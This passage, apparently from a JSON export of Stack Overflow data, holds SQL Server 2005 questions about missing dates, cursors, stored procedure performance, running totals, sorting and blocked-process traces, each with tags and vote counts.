  2010-08-04 12:00:00     2\n</code></pre>\n\n<p>None of these date ranges should ever span over midnight.<br>\nI want to write SQL that will give me the following output, given an input Start Date of 2010-08-02 and a Finish Date of 2010-08-05</p>\n\n<pre><code>Date          Name   TotalWork\n2010-08-03    Bob    7\n2010-08-03    Pete   3\n2010-08-04    Pete   4\n2010-08-04    Mark   2 \n</code></pre>\n\n<p>I could live with, and in fact may ultimately need, to have any days that do not have work associated also be represented in the results set, maybe as a row like this:</p>\n\n<pre><code>2010-08-05     NULL   0\n</code></pre>\n\n<p>I'm not quite sure how to iterate through dates in SQL in the same way that I would with other languages.</p>\n\n<p>To give this some context, the output of this will ultimately plug into a Stacked Chart .Net control.</p>\n\n<p>Could someone give me a clue, a link to a tutorial or some other help?  Otherwise I think I'll be fiddling with this for days!</p>\n\n<p>Thank you!</p>\n\n<p>Jonathan</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","gaps-and-islands"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":762,"score":0,"question_id":1659580,"title":"Generate missing dates + Sql Server (SET BASED)","body":"<p>I have the following </p>\n\n<pre><code>id eventid  startdate enddate\n\n1 1     2009-01-03 2009-01-05\n1 2     2009-01-05 2009-01-09\n1 3     2009-01-12 2009-01-15\n</code></pre>\n\n<p>How to generate the missing dates pertaining to every eventid?</p>\n\n<p>Edit:\n<strong>The missing gaps are to be find out based on the eventid's. e.g. for eventid 1 the output should be 1/3/2009,1/4/2009,1/5/2009.. for eventtype id 2 it will be 1/5/2009, 1/6/2009... to 1/9/2009 etc</strong></p>\n\n<p>My task is to find out the missing dates between two given dates.</p>\n\n<p>Here is the whole thing which i have done so far</p>\n\n<pre><code>declare @tblRegistration table(id int primary key,startdate date,enddate date)\ninsert into @tblRegistration \n    \tselect 1,'1/1/2009','1/15/2009'\ndeclare @tblEvent table(id int,eventid int primary key,startdate date,enddate date)\ninsert into @tblEvent \n    \tselect 1,1,'1/3/2009','1/5/2009' union all\n    \tselect 1,2,'1/5/2009','1/9/2009' union all\n    \tselect 1,3,'1/12/2009','1/15/2009'\n\n;with generateCalender_cte as\n(\n    select cast((select  startdate from @tblRegistration where id = 1 )as datetime) DateValue\n       union all\n        select DateValue + 1\n        from    generateCalender_cte   \n        where   DateValue + 1 &lt;= (select enddate from @tblRegistration where id = 1)\n)\nselect DateValue as missingdates from generateCalender_cte\nwhere DateValue not between '1/3/2009' and '1/5/2009'\nand DateValue not between '1/5/2009' and '1/9/2009'\nand DateValue not between '1/12/2009'and'1/15/2009'\n</code></pre>\n\n<p>Actually what I am trying to do is that, I have generated a calender table and from there I am trying to find out the missing dates based on the id's</p>\n\n<p>The ideal output will be</p>\n\n<pre><code>eventid                    missingdates\n\n1             2009-01-01 00:00:00.000\n\n1             2009-01-02 00:00:00.000\n\n3             2009-01-10 00:00:00.000\n\n3            2009-01-11 00:00:00.000\n</code></pre>\n\n<p>and also it has to be in SET BASED and the start and end dates should not be hardcoded</p>\n\n<p>Thanks in adavnce</p>\n"},{"tags":["sql-server","sql-server-2005","stored-procedures"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":12339295,"title":"Stored procedure and linked server","body":"<p>I have a stored procedure, which contains a simple select statement:</p>\n\n<pre><code>        ALTER PROCEDURE [dbo].[TransferAuditRecords] \nAs\nSET NOCOUNT ON\nSET XACT_ABORT ON\n\nDeclare @UserCode As varchar(50)\n\nDECLARE AuditCursor CURSOR FOR\n        select top 1 UserCode from [AuditDatabaseServer].AuditDatabase.dbo.dbaudit where auditdate &gt;= '2012-09-04'  \n        Open AuditCursor\n        FETCH NEXT FROM AuditCursor INTO @UserCode\n        WHILE @@FETCH_STATUS = 0  \n            BEGIN\n                Print @Usercode\n                FETCH NEXT FROM AuditCursor INTO @UserCode\n            END\n\n    Close AuditCursor \n    Deallocate AuditCursor \n</code></pre>\n\n<p>There are a few lines of code missing, which I excluded as they are irrelevant to the question.</p>\n\n<p>If I execute the SQL statement without the stored procedure i.e. in SQL Studio Manager 2005 then I get a different output than if I run the stored procedure i.e. the top reference returned is different.  Why are the outputs different? </p>\n\n<p>I am fairly sure that the reason for this is because SQL Server uses a different execution plan for compiled code is comparison to code being run in SQL Studio Manager.  I wanted to check though.</p>\n"},{"tags":["query","delphi","sql-server-2005","delphi-2010"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":139,"score":1,"question_id":12305761,"title":"SQL query doesnt finish in delphi","body":"<p>Im using SQL Server 2005 with Delphi 2010</p>\n\n<p>I have a table <code>ventas</code> with <code>id_venta</code> (PK)= id_sale, <code>total</code>(of the sale), (more values), <code>estado</code>=state(active/inactive) and <code>cumulative</code>.</p>\n\n<p>The table registers all the sales of articles of a store, and i need to register the cumulative sum of the total row by row. Im using the state field to specify the sales made in the shift if there were more than one shift in the day. Im using this query:</p>\n\n<pre><code>Declare @id integer; \nset @id=(Select min(id_venta) from ventas where estado='activo');\n\nwhile(select @id)&lt;=(Select max(id_venta) from ventas) \n  begin \n    update ventas set acumulado=(select sum(total) from ventas \n    where id_venta&lt;=@id and estado='activo') where id_venta=@id\n    select @id=@id+1 \n  end \n</code></pre>\n\n<p>This query does exacly what i want when i run it on SQL but when i do it on delphi it only gives me the comulative of about 151 rows of 431, not finishing.</p>\n\n<p>This is my delphi code:</p>\n\n<pre><code>conect.Q_equivalencias.Active:=false;\nconect.Q_equivalencias.SQL.Clear;\nconect.Q_equivalencias.SQL.Add('Declare @id integer; set @id=(Select min(id_venta) from ventas where estado='+char(39)+'activo'+char(39)+' );');\nconect.Q_equivalencias.SQL.Add('while(select @id)&lt;=(Select max(id_venta) from ventas) begin');\nconect.Q_equivalencias.SQL.Add('update ventas set acumulado=(select sum(total) from ventas  ');\nconect.Q_equivalencias.SQL.Add('where id_venta&lt;=@id and estado='+char(39)+'activo'+char(39)+') where id_venta=@id');\nconect.Q_equivalencias.SQL.Add('select @id=@id+1 end');\nconect.Q_equivalencias.ExecSQL;\n</code></pre>\n\n<p>What do i have to do so my query in Delphi finishes?</p>\n\n<p>Edit:</p>\n\n<p>Strange thing just happened, i tried with <code>conect.Q_equivalencias.Open;</code> insted of <code>conect.Q_equivalencias.ExecSQL;</code> and ofcourse it throw me an <code>error creating cursor handler</code>\nbut it finished the query, all rows were updated, why is that? </p>\n\n<p>Tried many things and it seems that my query on delphi only updates 152 rows...</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12320658,"title":"SQL Making Null Value in all columns which has a same value","body":"<p>I have a scenario in which i generate a temp table in that table i have to remove the repeating values like....</p>\n\n<pre><code>id      Ref_No  css_no  haz_no  Emp_no  X-Fac       Y-Fac   Location    street_name     Locale  town_name   admin_area\n341139  317000334   NULL    NULL    37101195    588550.00   185922.00       SUTTON ROAD     SOUTHEND-ON-SEA SOUTHEND-ON-SEA\n477641  317000334   NULL    NULL    37100003    582297.00   582297.00   ttttttttttttttttttttttttttttttttttttttttttttttttt.....  ABERDEEN GARDENS        LEIGH-ON-SEA    SOUTHEND-ON-SEA\n477641  317000334   NULL    NULL    37100003    85000.00    85000.00    ttttttttttttttttttttttttttttttttttttttttttttttttt.....  ABERDEEN GARDENS        LEIGH-ON-SEA    SOUTHEND-ON-SEA\n477641  317000334   NULL    NULL    37100003    85000.00    85000.00    ttttttttttttttttttttttttttttttttttttttttttttttttt.....  ABERDEEN GARDENS        LEIGH-ON-SEA    SOUTHEND-ON-SEA\n477649  317000334   NULL    NULL    37100004    591278.00   591278.00   aaaaaaaaaaaaaaaaaaaa    ACACIA DRIVE    THORPE BAY  SOUTHEND-ON-SEA SOUTHEND-ON-SEA\n477651  317000334   NULL    NULL    37101738    593365.00   593365.00   adfasdsfwerwer  ADJACENT TO 51 SANDPIPER CLOSE  SHOEBURYNESS    SOUTHEND-ON-SEA SOUTHEND-ON-SEA\n477661  317000334   NULL    NULL    37100036    589791.00   187149.00       ARCHER AVENUE       SOUTHEND-ON-SEA SOUTHEND-ON-SEA\n487012  317000334   NULL    NULL    42203885    359280.00   359280.00   yuiuyiuy    ABERDARE CLOSE  BURTONWOOD AND WESTBROOK    WARRINGTON  WARRINGTON\n</code></pre>\n\n<p>I want this table output as......</p>\n\n<pre><code>id      Ref_No  css_no  haz_no  Emp_no  X-Fac       Y-Fac   Location    street_name     Locale  town_name   admin_area\n    341139  317000334   NULL    NULL    37101195    588550.00   185922.00       SUTTON ROAD     SOUTHEND-ON-SEA SOUTHEND-ON-SEA\n    477641  317000334   NULL    NULL    37100003    582297.00   582297.00   ttttttttttttttttttttttttttttttttttttttttttttttttt.....  ABERDEEN GARDENS        LEIGH-ON-SEA    SOUTHEND-ON-SEA\n                        NULL    NULL                85000.00    85000.00    \n                        NULL    NULL                85000.00    85000.00    \n    477649  317000334   NULL    NULL    37100004    591278.00   591278.00   aaaaaaaaaaaaaaaaaaaa    ACACIA DRIVE    THORPE BAY  SOUTHEND-ON-SEA SOUTHEND-ON-SEA\n    477651  317000334   NULL    NULL    37101738    593365.00   593365.00   adfasdsfwerwer  ADJACENT TO 51 SANDPIPER CLOSE  SHOEBURYNESS    SOUTHEND-ON-SEA SOUTHEND-ON-SEA\n    477661  317000334   NULL    NULL    37100036    589791.00   187149.00       ARCHER AVENUE       SOUTHEND-ON-SEA SOUTHEND-ON-SEA\n    487012  317000334   NULL    NULL    42203885    359280.00   359280.00   yuiuyiuy    ABERDARE CLOSE  BURTONWOOD AND WESTBROOK    WARRINGTON  WARRINGTON\n</code></pre>\n\n<p>Like wise i need to remove the value which are returning again and agin for the same infomartion... can any one help me with this.... and the table wi'll be generated according with the condition each time so the values may not be same all time...</p>\n"},{"tags":["c#","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":74,"score":2,"question_id":12325043,"title":"A stored procedure works only when I restart the SQL Server Database Server","body":"<p>In one my company's internal projects built on C#, ASP.Net, SQL server 2005 and Windows Server 2008, the login stored procedure just takes infinite amount of time when some one tries to login. But when I restart the database server, the problem is fixed. This happens everyday. This might not be database load problem as other stored procedures just work fine. Also if I pull out the query inside the stored procedure, I get the results in proper time. In the stored procedure apart from fetching data there is an if condition which restricts users to some IPs only. </p>\n\n<p>I don't know what the problem is. Can some one please help me in figuring out the problem.\nThanks in advance.</p>\n\n<p>Here is the Stored Procedure</p>\n\n<pre><code>ALTER PROCEDURE [dbo].[get_user]          \n@username varchar(50), @pwd varchar(50), @passcode varchar(50), @ipaddress varchar(15)          \nAS          \nBEGIN          \n IF(@ipaddress = 'aaa.aaa.aaa.aaa' OR @ipaddress = 'aaa.aaa.aaa.aaa' OR @ipaddress = 'aaa.aaa.aaa.aaa')          \n BEGIN          \n  IF EXISTS(select up_id from tbl_user_profile (nolock) WHERE up_status='Y')          \n  BEGIN          \n   DECLARE @ri_date_time varchar(20)          \n   SET @ri_date_time=convert(varchar(50),getdate(),120)          \n   DECLARE @user_exists as int          \n   Set @user_exists = 0          \n   Set @user_exists = (Select count(*) from tbl_recent_items (nolock) where ri_user_name=@username)          \n   IF @user_exists = 0          \n   BEGIN          \n    BEGIN TRAN          \n     INSERT INTO tbl_recent_items (ri_user_name, ri_access_date_time) values (@username, @ri_date_time+'|'+@ipaddress+'^')          \n     IF @@error=0 COMMIT TRAN ELSE ROLLBACK TRAN          \n   END          \n   ELSE          \n   BEGIN          \n    DECLARE @datetext varchar(max)          \n    SET @datetext = (select isnull(ri_access_date_time,'') from tbl_recent_items(nolock) where  ri_user_name=@username)          \n    SET @datetext=@ri_date_time+'|'+@ipaddress+'^'+@datetext          \n    BEGIN TRAN          \n     UPDATE tbl_recent_items Set ri_access_date_time=@datetext where ri_user_name = @username          \n     IF @@error=0 COMMIT TRAN ELSE ROLLBACK TRAN          \n   END          \n  END          \n  SELECT CONVERT(varchar(4),up_id) as up_id,LTRIM(RTRIM(isnull(up_user_name,''))) as u_user_name,           \n  ISNULL(up_password,'') as u_user_password,isnull(up_first_name,'') as up_first_name,           \n  ISNULL(up_middle_name,'') as up_middle_name, isnull(up_last_name,'') as up_last_name,           \n  ISNULL(up_branch_id,'') as up_branch_id, isnull(b_branch_id,'') as b_branch_id,          \n  ISNULL(b_branch_name,'') as b_branch_name,isnull(up_mobile_phone,'') as up_mobile_phone,          \n  --ISNULL(up_pager_phone,'') as up_pager_phone,  \n  isnull(up_email,'') as up_email,          \n  ISNULL(up_status,'') as u_status,   \n  --isnull(up_job_posting_phone,'') as up_job_posting_phone,          \n--  ISNULL(up_level,'') as up_level, \n    isnull(up_trainee,'0') as up_trainee,          \n  ISNULL(up_senior,'0') as up_senior, isnull(up_team_lead,'0') as up_team_lead, isnull(up_ist,'0')as up_ist, up_hyd_branch,    \n  convert(varchar(10),up_password_date,102)as up_password_date    \n  FROM tbl_user_profile (nolock)           \n  LEFT OUTER JOIN tbl_branches (nolock) on up_branch_id = b_id where           \n  up_user_name = @username and up_password =@pwd          \n END          \n IF EXISTS(select up_id from tbl_user_profile (nolock) WHERE up_user_name = @username and up_password = @pwd and up_passcode = @passcode and up_status='Y')          \n BEGIN          \n  IF EXISTS(select up_id from tbl_user_profile (nolock) WHERE up_status='Y')          \n  BEGIN          \n   DECLARE @ri_date_time1 varchar(20)          \n   SET @ri_date_time1=convert(varchar(50),getdate(),120)          \n   DECLARE @user_exists1 as int          \n   Set @user_exists1 = 0          \n   Set @user_exists1 = (Select count(*) from tbl_recent_items (nolock) where ri_user_name=@username)          \n   IF @user_exists1 = 0          \n   BEGIN          \n    BEGIN TRAN          \n     INSERT INTO tbl_recent_items (ri_user_name, ri_access_date_time) values (@username, @ri_date_time1+'|'+@ipaddress+'^')          \n     IF @@error=0 COMMIT TRAN ELSE ROLLBACK TRAN          \n   END          \n   ELSE          \n   BEGIN          \n    DECLARE @datetext1 varchar(max)          \n    SET @datetext1 = (select isnull(ri_access_date_time,'') from tbl_recent_items(nolock) where  ri_user_name=@username)          \n    SET @datetext1=@ri_date_time1+'|'+@ipaddress+'^'+@datetext1          \n    BEGIN TRAN          \n     UPDATE tbl_recent_items Set ri_access_date_time=@datetext1 where ri_user_name = @username          \n     IF @@error=0 COMMIT TRAN ELSE ROLLBACK TRAN          \n   END          \n  END          \n  SELECT CONVERT(varchar(4),up_id) as up_id,LTRIM(RTRIM(isnull(up_user_name,''))) as u_user_name,           \n  ISNULL(up_password,'') as u_user_password,isnull(up_first_name,'') as up_first_name,           \n  ISNULL(up_middle_name,'') as up_middle_name, isnull(up_last_name,'') as up_last_name,           \n  ISNULL(up_branch_id,'') as up_branch_id, isnull(b_branch_id,'') as b_branch_id,          \n  ISNULL(b_branch_name,'') as b_branch_name,isnull(up_mobile_phone,'') as up_mobile_phone,          \n  --ISNULL(up_pager_phone,'') as up_pager_phone,  \n  isnull(up_email,'') as up_email,          \n  ISNULL(up_status,'') as u_status,  \n   --isnull(up_job_posting_phone,'') as up_job_posting_phone,          \n--  ISNULL(up_level,'') as up_level, \n isnull(up_trainee,'0') as up_trainee,          \n  ISNULL(up_senior,'0') as up_senior, isnull(up_team_lead,'0') as up_team_lead,isnull(up_ist,'0')as up_ist, up_hyd_branch,    \n  convert(varchar(10),up_password_date,102)as up_password_date    \n  FROM tbl_user_profile (nolock)           \n  LEFT OUTER JOIN tbl_branches (nolock) on up_branch_id = b_id where           \n  up_user_name = @username and up_password =@pwd          \n END          \nEND\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","dbo"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1176,"score":2,"question_id":1330833,"title":"lu.[TableName] instead of dbo.[TableName]?","body":"<p>Some of the tables in my SQL Server 2005 database is named as lu.[TableName] instead of dbo.[TableName]. What does lu stand for? </p>\n\n<p>Note: I tried google already</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","join"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":5,"view_count":99,"score":-3,"question_id":12318452,"title":"SQL Server - Join Query","body":"<p>Here are my tables </p>\n\n<pre><code>  StudentID    Name\n    ----------   ------\n      1          Mary\n      2          John\n      3          Peter\n      4          Edwards\n\n   ClassID      StudentIDs\n    --------    -----------\n      1          1,2\n      2          3,4\n\n    **Output Expected**\n\n    ClassID   Names\n    -------   -------\n\n        1      Mary,John\n        2      Peter,Edwards\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":100,"score":3,"question_id":12319185,"title":"Using the dangerous IN clause in SQL","body":"<p>Why does SQL server behave this way. I am running this on SQL 2005.</p>\n\n<p>The IN clause does not validate the column names in the sub query but validates it\nagainst the table name in the outer query.  Here is an example of getting </p>\n\n<pre><code>Create table #table1(col1 int, col2 char(10), col3 char(15));\n\nCreate table #table2(col10 int, col11 char(10), col2 char(15));\n\n\ninsert into #table1(col1, col2, col3)\nselect 1, 'one', 'three'\n\ninsert into #table1(col1, col2, col3)\nselect 2, 'two', 'three'\n\ninsert into #table1(col1, col2, col3)\nselect 3, 'three', 'four'\n\n\ninsert into #table2(col10, col11, col2)\nselect 1, 'one', 'three'\n\ninsert into #table2(col10, col11, col2)\nselect 2, 'two', 'three'\n\ninsert into #table2(col10, col11, col2)\nselect 3, 'three', 'four'\n\n\nselect * from #table1\nwhere col1 IN\n(select col1 from #table2)\n</code></pre>\n\n<p>Where as if I just select the \"select col1 from #table2\" and run it spits an error</p>\n\n<pre><code>Msg 207, Level 16, State 1, Line 1\nInvalid column name 'col1'.\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12235392,"title":"automatically fill up values for missing date rows","body":"<p>I have a table similar to the following</p>\n\n<pre><code>Date   | qty1 | qty2 | qty3 | qty4 | column6\n1 july | 33   | 0    |  0   | 0    | xyz\n1 July | 0    | 20   | 0    | 0    | xyz\n1 July | 18   | 0    | 0    | 0    | abc\n3 July | 0    | 0    | 0    | 11   | abc\n3 july | 23   | 0    |  0   | 0    | xyz\n4 July | 0    | 40   | 0    | 0    | xyz\n4 July | 57   | 0    | 0    | 0    | abc\n7 July | 0    | 12   | 0    | 0    | xyz\n</code></pre>\n\n<p>And I'm looking for output as below in a stored procedure in sql server 2005.</p>\n\n<pre><code> Date   | qty1 | qty2 | qty3 | qty4 \n 1 July | 51   | 20   | 0    | 0 \n 2 July | 0    | 0    | 0    | 0\n 3 July | 23   | 0    | 0    | 11\n 4 July | 57   | 40   | 0    | 0\n 5 July | 0    | 0    | 0    | 0\n 6 July | 0    | 0    | 0    | 0\n 7 July | 0    | 12   | 0    | 0\n</code></pre>\n\n<p>As you notice, I want it to put automatically 0 values for missing date. I'm wondering if it's possible.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":16445,"score":1,"question_id":5125609,"title":"How to select date without time in SQL","body":"<p>When I select date in SQL it is returned as  <code>2011-02-25 21:17:33.933</code>. But I need only the Date part, that is <code>2011-02-25</code>. How can I do this?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":12313687,"title":"Update table Error Using Convert Function In SQL Server 2005","body":"<p>I have a table with two columns, all of them are datetime value\nSuch as, Column A with value ‘07/09/2012 14:13:34’\nNow, I want to update column A to yyyymmdd by statement</p>\n\n<pre><code> Update Change_Date\n    SET A = CONVERT(VARCHAR(8),A,112)\n</code></pre>\n\n<p>It shows succsessful message but with no effect (no update value to 20120907) in my table Change_Date.</p>\n\n<p>Any help will be greated, thank you!</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1908,"score":1,"question_id":2098759,"title":"SQL Server 2005 - Setting a column as readonly","body":"<p>I have a \"InsertTime\" field in a table in a SQL Server 2005 database which is defaulted to \"getDate()\" when the record is first inserted into the database.  I want to ensure that this column is not updated again.  </p>\n\n<p>Can this column be set to readonly or is there a better way to do this without writing all of the sql for the developers?</p>\n"},{"tags":["sql-server-2005","sql-update"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12314336,"title":"how to improve update performance in SQL server 2005?","body":"<p>I want to speed up my update in SQL server 2005. </p>\n\n<p><em>1.I have clustered the indexes used and dropped  unused ones.</em></p>\n\n<p><em>2.I have used join instead of sub query.</em></p>\n\n<p>Any other suggestion to improve the performance?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":135,"score":1,"question_id":8541329,"title":"Natural Sort in SQL Server 2005","body":"<p>I am using C# and SQL Server 2005.  I have a dataset with table numbers like so that I need to have a natural sort on:</p>\n\n<pre><code> 1\n 10\n 2\n I.1\n Table 1\n Table 2\n Table 10\n I.10\n I.2\n</code></pre>\n\n<p>Above is my numbers, and I want them to be sorted number first (1,2, ... , 10, 11), then by the alphabet (I.1, I.2, ... ,1.10, I.11, etc.) which would put Table 1, Table 2, ... , Table 10, ... at the end.</p>\n\n<p>Is there any way to do this with some funky SQL?</p>\n\n<p>(Note: I can't use a C# natural sort function as I can't load the entire dataset all at once.)</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":2,"view_count":91,"score":3,"question_id":12307471,"title":"Update a column where it is NULL","body":"<p>I have a table Person that contains a column isStaff (bit), that allows NULL values.</p>\n\n<p>The purpose is that this field must contains values 0/1; however, due to lack of application handling of user input in the first place, there are multiple records with the NULL value in this column.</p>\n\n<p>If I try to execute this query:</p>\n\n<pre><code>UPDATE Person\nSET isStaff = 0\nWHERE isStaff IS NULL\n</code></pre>\n\n<p>I get the error:</p>\n\n<blockquote>\n  <p><em>Subquery returned more than 1 value. This is not permitted when the subquery\n  follows =, !=, &lt;, &lt;= , >, >= or when the subquery is used as an expression.</em></p>\n</blockquote>\n\n<p>Any idea how to resolve this problem?</p>\n"},{"tags":["database","sql-server-2005","datamodel"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":12307886,"title":"Data modeling revisited - clinging to old identities?","body":"<p>I've been revisiting why I've been doing certain things in SQL Server 2005 data modeling. </p>\n\n<p>I've habitually used identities for table keys, making unique indexes for the actual data that should be unique instead of keying off that.</p>\n\n<p>So, if I had a student table, I might have:</p>\n\n<pre><code>ID identity primary key,\nStudentIdentifier char(8)\n</code></pre>\n\n<p>I'd put a unique index on StudentIdentifier since this is the code that the university would use to reference a student, but I'd store Student.ID in any tables that referenced Student.</p>\n\n<p>Is using an autoNumber Identity field still a good practice in SQL Server (version 2005)?</p>\n\n<p>Also -</p>\n\n<p>I use int codes for lookup values and store those ints in the corresponding referencing tables.</p>\n\n<p>For example, I might have a workflow table like this:</p>\n\n<pre><code>id  statuscode      DESCRIPTION         \n1   CIProgress      CI Grade in Progress\n2   Finalized       Finalized           \n3   NeedsSingle     Needs Single Read   \n4   NeedsFirst      Needs First Read    \n5   SingleProgress  Single Read in Progress\n</code></pre>\n\n<p>In a table that had a workflow attribute, I'd store the id (1) and then join against the workflow table to get the statuscode or description.</p>\n\n<p>Is it okay to store the statuscode, for example, instead? How much efficiency am I gaining by using the int over a short code?</p>\n\n<p>I've seen a lot of implementations in the 15 years since I started coding, and it occurs to me that maybe i'm taking old \"rules\" to heart without thinking about practice.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":183,"score":3,"question_id":12100566,"title":"sort results by column not row","body":"<p>is it possible in SQL to sort by column and not by row? i do not need a basic ORDER BY statement, i know how those work (ie: order by column1, column2, etc).  </p>\n\n<p>basically trying to sort something like this:</p>\n\n<pre><code>column 1    column 2    column 3\n   1            0           3 \n</code></pre>\n\n<p>trying to sort to this:</p>\n\n<pre><code>column 3    column 1    column 2\n   3           1           0 \n</code></pre>\n\n<p>Is this even possible in SQL? preferably t-sql or anything that will run on sql server 2005</p>\n\n<p>ive been searching online for hours on this and no one even seems to want to ask this question. or i suck at searching.</p>\n\n<pre><code>   ; with numbered as\n   (\n     select SUM(OrderReceived) as c1, SUM(OrderOnHold) as c2, SUM(OrderConfirmed) as     c3,\n     row_number() over (order by employee) RecordNumber\n     from( SELECT \n\n\ne.FirstName+' '+e.LastName AS Employee\n,CASE WHEN oim.MilestoneID = 10 THEN 1 ELSE 0 END as OrderReceived\n,CASE WHEN oim.MilestoneID = 15 THEN 1 ELSE 0 END as OrderOnHold\n,CASE WHEN oim.MilestoneID = 20 THEN 1 ELSE 0 END as OrderConfirmed\nFROM OrderItems oi\n    JOIN Orders o on o.orderid = oi.orderid\n    JOIN OrderItemMilestones oim on oim.orderid = oi.orderid and oim.orderitemid     =     oi.orderitemid\n    JOIN Milestones m on m.milestoneid = oim.milestoneid\n    JOIN Employees e on e.username = oim.recordedbyuser\n    JOIN Clients cl on cl.clientid = o.clientid\nWHERE oim.MilestoneDate Between '2012-08-01' and '2012-08-05'\n    and e.terminationdate is null\n),\n\nordered as\n(\n select SUM(OrderReceived) as c1, SUM(OrderOnHold) as c2, SUM(OrderConfirmed) as c3,\n         row_number() over (partition by RecordNumber\n                           order by employee desc) rn\n    from numbered\n\n  unpivot (v for c in (c1, c2, c3)) u\n)\nselect RecordNumber,\n     [1] c1,\n     [2] c2,\n     [3] c3\n from \n (\n select RecordNumber,\n         v,\n         Rn\n    from ordered\n  ) o\n pivot (min(employee) for Rn in ([1], [2], [3])) p\n</code></pre>\n"},{"tags":["sql-server-2005","stored-procedures"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12306589,"title":"Which process thread is calling a stored procedure","body":"<p>Is there a way to tell in SQL Server 2005 which process and thread made a call to some stored procedure? Preferably programmatically.</p>\n\n<p>Thanks</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":116,"score":3,"question_id":12303795,"title":"How can I spread a value across multiple rows without a cursor?","body":"<p>Is there an easy way to spread a value across multiple rows?</p>\n\n<p>For example, my table contains</p>\n\n<pre>\nType      Invoiced    Paid    Current\nCharge    100         0       100\nCharge    100         0       100\nCharge    100         0       100\nPayment   0         250       0\nPayment   0          25       0\n</pre>\n\n<p>The data is imported this way, but I need to populate the <code>Current</code> and <code>Paid</code> columns with whatever they should be for that transaction based on the payment transactions that were also imported.</p>\n\n<p>Is there an easy way to write a query to determine the balance for the <code>Current</code> column for each record?</p>\n\n<p>For example, the 250 would apply 100 for the first two records and 50 to the next two, and the 25 would get applied to the last one, so the end result after updating the <code>Current</code> balance in my table should be:</p>\n\n<pre>\nType      Invoiced    Paid    Current\nCharge    100         100     0\nCharge    100         100     0\nCharge    100          75     25\nPayment   0           250     0\nPayment   0            25     0\n</pre>\n\n<p>I'd ideally like to do this with a single query instead of using a cursor to process each item individually. I've been trying to do it by using the <a href=\"http://msdn.microsoft.com/en-us/library/ms186734.aspx\" rel=\"nofollow\">Row_Number()</a> function and joining two subqueries, but I know I'm missing something here</p>\n\n<p>Here was my first attempt, which resulted in getting the running total of the current balance</p>\n\n<pre><code>;with cte(invoiced, paid, current)\nas (\n    select invoiced, paid, current\n        , row_number() over (order by datecreated)\n    from mytable\n)\n\nselect t1.invoiced, t1.paid, sum(t2.invoiced - t2.paid) as [current]\nfrom cte as t1\njoin cte as t2 on t1.number = t2.number and t2.rownum &lt;= t1.rownum\ngroup by t1.uid, t1.number, t1.rownum\norder by t1.rownum\n</code></pre>\n\n<p>Result:</p>\n\n<pre>\nInvoiced    Paid    Current\n100         0       100\n100         0       200\n100         0       300\n0         250       50\n0          25       25\n</pre>\n\n<p>I'm sure there's a way to do this, but right now my brain seems on strike and is refusing to come up with a solution.</p>\n"},{"tags":["performance","sql-server-2005","process","locking","trace"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12304331,"title":"blocked process trace - blocking process suspended","body":"<p>Below is part of the xml output of a SQL Server 2005 blocked process trace - that I have running for a client. This section of the xml represents data detailing the <strong>blocking</strong> process. This process says it is “suspended” meaning that is is waiting on another process, or resource before it can finish… and it has been waiting for a number of minutes! Trace records similar to this occur over, and over again, but I cannot find another blocked process record in the trace, that shows this proccess being blocked by another process. </p>\n\n<p>So.. how can I find out what is causing this process to be suspended? </p>\n\n<p>I do know what SQL is being run (a SELECT statement), so I know the table that is being blocked – but I don’t know what is blocking that table. Where would you go in looking for what is suspending this process? </p>\n\n<pre><code>&lt;process status=\"suspended\" waittime=\"254406\" spid=\"191\" sbid=\"0\" ecid=\"0\" priority=\"0\" transcount=\"1\" lastbatchstarted=\"2012-09-04T09:08:12.923\" lastbatchcompleted=\"2012-09-04T09:08:12.920\" clientapp=\"Sage Pro ERP version 7.4\" hostname=\"ZZZ-ZZ04\" hostpid=\"5960\" loginname=\"ZZZZ\" isolationlevel=\"read uncommitted (1)\" xactid=\"804301839\" currentdb=\"15\" lockTimeout=\"4294967295\" clientoption1=\"536870944\" clientoption2=\"128056\"&gt;\n</code></pre>\n\n<p>Any help would be appreciated.</p>\n\n<p>--Thanks\nMike 